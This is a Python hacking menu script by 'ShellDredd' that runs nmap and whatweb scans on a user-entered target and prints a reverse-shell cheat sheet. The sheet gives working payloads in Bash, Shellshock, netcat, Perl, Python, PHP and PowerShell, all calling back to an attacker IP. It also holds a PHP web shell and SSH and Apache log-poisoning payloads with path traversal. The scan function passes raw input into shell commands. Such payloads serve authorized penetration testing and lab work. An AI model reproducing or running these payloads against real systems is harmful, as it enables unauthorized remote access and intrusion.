#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#Author: || ShellDredd ||
#Twitter: @ShellDredd

import requests, time, subprocess, os, re
from subprocess import call
from tqdm import tqdm
from time import sleep

#Colors
cs_color='\033[0;m'
def charizar(skk): print("\x1b[1;91m {}\033[01m" .format(skk) + cs_color)
def bulbasur(skk): print("\x1b[1;32m {}\033[01m" .format(skk) + cs_color)
green="\x1b[1;32m"
red="\x1b[1;91m"

#Go Code
print ("")
charizar ('(っ◔◡◔)っ ♥INSTALL PROCESS, PLEASE RELAX THE HACK♥')
print ("")
#Line Loading
process = 100
charizar ('(<>..<>) ...Loading...')
for i in tqdm(range(process)):
    sleep(0.01)

charizar ('(<>..<>) ♥PROCESS SUCCESSFULLY COMPLETED♥')
sleep(0.5)
os.system('clear')

#Head
charizar ('░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░ ')
charizar ('██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░ ')
charizar ('╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░ ')
charizar ('░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░ ')
charizar ('██████╔╝██║░░██║███████╗███████╗███████╗ ')
charizar ('╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝ ')
charizar ('     ██████╗░██████╗░███████╗██████╗░██████╗░ ')
charizar ('     ██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗ ')
charizar ('     ██║░░██║██████╔╝█████╗░░██║░░██║██║░░██║ ')
charizar ('     ██║░░██║██╔══██╗██╔══╝░░██║░░██║██║░░██║ ')
charizar ('     ██████╔╝██║░░██║███████╗██████╔╝██████╔╝ ')
charizar ('     ╚═════╝░╚═╝░░╚═╝╚══════╝╚═════╝░╚═════╝░ ')
print("")
charizar ('        ꧁   ✪✪✪✪✪✪ Red Series ✪✪✪✪✪✪   ꧂  ')

#Structure Menu & Submenu Reverse
while True:
    print ("")
    charizar ('(っ◔◡◔)っ ♥MENU♥')
    bulbasur ('❰1❱SEXY MODE   ❰2❱BONUS STAGE   ❰3❱REVERSE   ❰4❱BYE BYE')
    print ("")
    action = input(red + "\n" + "\t\t(づ ￣ ³￣)づ Number ➭➭➭ " + green + "$ " + green)

    if action == "1":
        os.system('clear')
        print ("")
        charizar ('          ♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
        charizar ('(っ◔◡◔)っ  SEXY SCAN MODE ACTIVATE  (づ ￣ ³￣)づ')
        charizar ('          ♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
        print ("")
        host1 = subprocess.getoutput('hostname -I')
        host2 = subprocess.getoutput('hostname -i')
        print (red + '      ·IP Home ➭➭➭ '+ green + str(host1) + '|| ' + str(host2))
        print ("")
        bulbasur(red + '     ·Local Host' + green + ' connection:')
        os.system('sudo arp-scan -l | grep "192"')
        print ("")
        ip = input(red + '          ♥ IP/HOST/WEB ➭➭➭ $ ' + green)
        os.system('clear')
        print ("")
        bulbasur ('(<>..<>) LOADING♥♥♥')
        print ("")
        for i in tqdm(range(process)):
                sleep(0.0001)

        print ("")
        charizar ('     ♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
        bulbasur ('     (っ◔◡◔)っ WORKING SCAN')
        charizar ('     ♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
        charizar ('    Don`t stick your arms out.')
        print('       ╔══╗░░░░╔╦╗░░╔═════╗ ')
        print('       ║╚═╬════╬╣╠═╗║░▀░▀░║ ')
        print('       ╠═╗║╔╗╔╗║║║╩╣║╚═══╝║ ')
        print('       ╚══╩╝╚╝╚╩╩╩═╝╚═════╝ ')
        bulbasur('Please wait | Bytes time my friend')
        print ("")
        nmap = subprocess.getoutput('sudo nmap -n -sS -sV --min-rate 5000 -p- ' + str(ip) + ' | grep "open"')
        vweb = subprocess.getoutput('sudo whatweb '+ str(ip))
        charizar ('          Information Extraction')
        charizar ('=================================')
        charizar ('(っ◔◡◔)っ DETAILS WEB')
        print (green + str(vweb) + cs_color)
        print ("")
        charizar ('(っ◔◡◔)っ||| Ports Scan |||')
        print ("PORT ||  STATUS     ||     SERVICE")
        print (green + str(nmap) + cs_color)
        print ("")
        charizar ('=================================')
        charizar ('(づ ￣ ³￣)づ SCANNING COMPLETED')
        charizar ('=================================')
        print ("")
    
    #Bonus function
    if action == "2":
        os.system('clear')
        print ("")
        charizar ('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿')
        charizar ('⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢦⠙⢿⣿⣿⣿⣿⣿⣿⣿')
        charizar ('⣿⣿⣿⣿⢯⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⠛⢿⣿⣿⣿⣿⣿   SHELLDREDD')
        charizar ('⣿⣿⣿⢧⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡕⠂⠈⢻⣿⣿⣿⣿')
        charizar ('⣿⣿⡅⣻⡿⢿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠿⢿⣿⡇⠀⠀⠈⣿⣿⣿⣿' + green + '  A lover of cyber communities,')
        charizar ('⣿⣿⠀⠀⠀⠘⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⣹⣿⣿⣿' + green + '  the FOSS ecosystem and programming.')
        charizar ('⣿⣿⠀⠀⠀⠀⣿⣿⡿⠿⠛⠻⣿⣿⣿⣿⡿⠟⠁⠈⠀⠉⠻⡆⠀⠀⠀⣿⣿⣿' + green + '  Active Debian user and wanted by')
        charizar ('⣿⣯⠄⠂⠀⠀⣿⡋⠀⢀⠀⠀⠀⠉⣿⣿⡀⠀⠀⠘⠓⣠⣶⣿⡀⠀⠀⠘⣿⣿' + green + '  for advertising free software on')
        charizar ('⣿⣫⡆⠀⠀⢀⣿⣷⣶⣄⠀⢀⣤⣴⣿⣿⣿⣶⣄⠀⣴⣿⣿⣿⠁⠀⠀⠀⠘⣿')
        charizar ('⣿⣿⠁⠀⠀⡤⠙⢿⣿⣿⣷⣾⣿⡿⣿⣿⢿⠿⣿⣧⣿⣿⡿⢣⠀⠀⠀⠀⢠⣿' + green + '  He is said to be a faithful follower of')
        charizar ('⣷⣌⠈⠀⠀⠀⠀⣆⠈⡉⢹⣿⣿⣆⡀⠀⠀⢠⣿⣿⣿⡿⢃⣼⠀⠀⠀⠀⣸⣿' + green + '  Richard Cuture and Richard Stallman.')
        charizar ('⣿⣿⡇⠀⠀⠀⠀⠙⢿⣿⣆⠈⠛⠛⠛⠀⠀⠈⠉⠁⠀⢠⣿⠇⠀⠀⠀⠹⢿⡇' + green + '  On Fridays he eats homemade pizza')
        charizar ('⣿⡫⠀⠀⠁⠀⠀⠀⠈⠻⣿⢢⣄⠀⠀⠀⠀⠀⣀⣠⣾⡾⠋⠀⠀⠀⠀⢀⠴⠋' + green + '  # Linked to the Code Security group')
        charizar ('⣿⣁⠄⠀⠀⠀⣀⠀⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⠿⡿⠋⠀⠀⠀⠀⠀⣀⠬⠆⢀' + green + '  # Operations Team:')
        charizar ('⣿⣿⣧⣄⠀⠀⠉⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠠⠙' + green + '    d4t4s3c - LukenGazte - [+]Noname[+]')
        print ("")
        charizar ('♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
        charizar ('     (っ◔◡◔)っ ♥Always Hack')
        charizar ('♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
    #Reverse-shell function | Menu | Function loop for listing reverse-shell |
    if action == "3":
        os.system('clear')
        while True:
            print ("")
            charizar ('           ♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
            charizar ('           (っ◔◡◔)っ ♥REVERSE|SHELL LIST')
            charizar ('           ♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
            print ('''
            ''' + red + '''❰0❱''' + green + '''BACK|MENU
            ''' + red + '''❰1❱''' + green + '''Bash   
            ''' + red + '''❰2❱''' + green + '''Shellshock   
            ''' + red + '''❰3❱''' + green + '''NetCat   
            ''' + red + '''❰4❱''' + green + '''Web-Shell
            ''' + red + '''❰5❱''' + green + '''Perl   
            ''' + red + '''❰6❱''' + green + '''Python   
            ''' + red + '''❰7❱''' + green + '''PHP   
            ''' + red + '''❰8❱''' + green + '''PowerShell
            ''')
            print ("")
            action2 = input(green + "\n" + "(づ ￣ ³￣)づ Number ➭➭➭ $ " + cs_color)
            os.system('clear')

            if action2 == "0":
                os.system('clear')

                break

            if action2 == "1":
                os.system('clear')
                charizar('               ♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
                charizar('              (っ◔◡◔)っREVERSE|BASH')
                charizar('              ------------------------------------------------------------------------')
                bulbasur('''\n
                |$ bash -i >& /dev/tcp/192.168.1.2/443 0>&1 \n
                |$ bash -c "bash -i >& /dev/tcp/192.168.1.2/443 0>&1" \n
                |$ bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%22
                ''')
                charizar('              (づ ￣ ³￣)づ-------------------------------------------------------------')

                print ("")

            if action2 == "2":
                os.system('clear')
                charizar ('              ♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
                charizar('              (っ◔◡◔)っREVERSE|SHELLSHOCK')
                charizar('              ------------------------------------------------------------------------')
                bulbasur('''\n
                |$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'"\n
                 "http://192.168.1.3/cgi-bin/user.sh"
                ''')
                charizar('              (づ ￣ ³￣)づ-------------------------------------------------------------')

                print ("")

            if action2 == "3":
                os.system('clear')
                charizar ('              ♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
                charizar('              (っ◔◡◔)っREVERSE|NETCAT')
                charizar('              ------------------------------------------------------------------------')
                bulbasur('''\n
                |$ ncat 192.168.1.2 443 -e /bin/bash\n
                |$ nc -e /bin/sh 192.168.1.2 443 \n
                |$ nc -e /bin/bash 192.168.1.2 443 \n
                |$ nc -c bash 192.168.1.2 443 \n
                |$ nc.exe -e cmd 192.168.1.2 443 \n
                |$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f \n
                |$ rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%\n
                02%3E%261%7Cnc%20192.168.1.2%20443%20%3E%2Ftmp%2Ff
                ''')
                charizar('              (づ ￣ ³￣)づ-------------------------------------------------------------')

                print ("")

            if action2 == "4":
                os.system('clear')
                charizar ('              ♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
                charizar('              (っ◔◡◔)っREVERSE|WEB SHELL')
                charizar('              ------------------------------------------------------------------------')
                bulbasur('''\n
                |$ <?php system($_GET['cmd']);?> \n
                !0!(SSH Log Poisoning) -> /var/log/auth.log \n
                |$ ssh '<?php system($_GET['cmd']); ?>'@192.168.1.2 \n
                !0!(HTTP User-Agent Log Poisoning) -> /var/log/apache2/access.log \n
                |$ curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>"\n
                 "http://192.168.1.2/browse.php?file=../../../../../var/log/apache2/access.log"\n
                ''')
                charizar('              (づ ￣ ³￣)づ-------------------------------------------------------------')

                print ("")

            if action2 == "5":
                os.system('clear')
                charizar ('              ♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
                charizar('              (っ◔◡◔)っREVERSE|PERL')
                charizar('              ------------------------------------------------------------------------')
                bulbasur('''\n
                |$ perl -e 'use Socket;$i="192.168.1.2";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname\n
                ("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");\n
                open(STDERR,">&S");exec("/bin/sh -i");};'
                ''')
                charizar('              (づ ￣ ³￣)づ-------------------------------------------------------------')

                print ("")

            if action2 == "6":
                os.system('clear')
                charizar ('              ♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
                charizar('              (っ◔◡◔)っREVERSE|PYTHON')
                charizar('              ------------------------------------------------------------------------')
                bulbasur('''\n
                |$  export RHOST="192.168.1.2";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket()\n
                ;s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\n
                ;pty.spawn("/bin/sh")' \n
                |$  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n
                ;s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0)\n
                ; os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' \n
                |$  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n
                ;s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0)\n
                ; os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
                ''')
                charizar('              (づ ￣ ³￣)づ-------------------------------------------------------------')

                print ("")

            if action2 == "7":
                os.system('clear')
                charizar ('              ♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
                charizar('              (っ◔◡◔)っREVERSE|PHP')
                charizar('              ------------------------------------------------------------------------')
                bulbasur('''\n
                |$ php -r '$sock=fsockopen("192.168.1.2",443);exec("/bin/sh -i <&3 >&3 2>&3");'\n
                |$ php -r '$sock=fsockopen("192.168.1.2",443);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
                ''')
                charizar('              (づ ￣ ³￣)づ-------------------------------------------------------------')

                print ("")

            if action2 == "8":
                os.system('clear')
                charizar ('              ♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥♥')
                charizar('              (っ◔◡◔)っREVERSE|POWERSHELL')
                charizar('              ------------------------------------------------------------------------')
                bulbasur('''\n
                |$ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.1.2",443);\n$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);\n
                $stream.Flush()};$client.Close()\n
                ''')
                charizar('              (づ ￣ ³￣)づ-------------------------------------------------------------')

                print ("")
    #Exit Function 
    if action == "4":
        print ("")
        os.system('clear')
        charizar ('(っ◔◡◔)っ ♥ALLWAYS HACK && NO PROBLEM♥')
        charizar ("SHELLDREDD SAY BYE BYE (づ ￣ ³￣)づ")
        print ("")

        break

pass

#Always Hack || ShellDredd
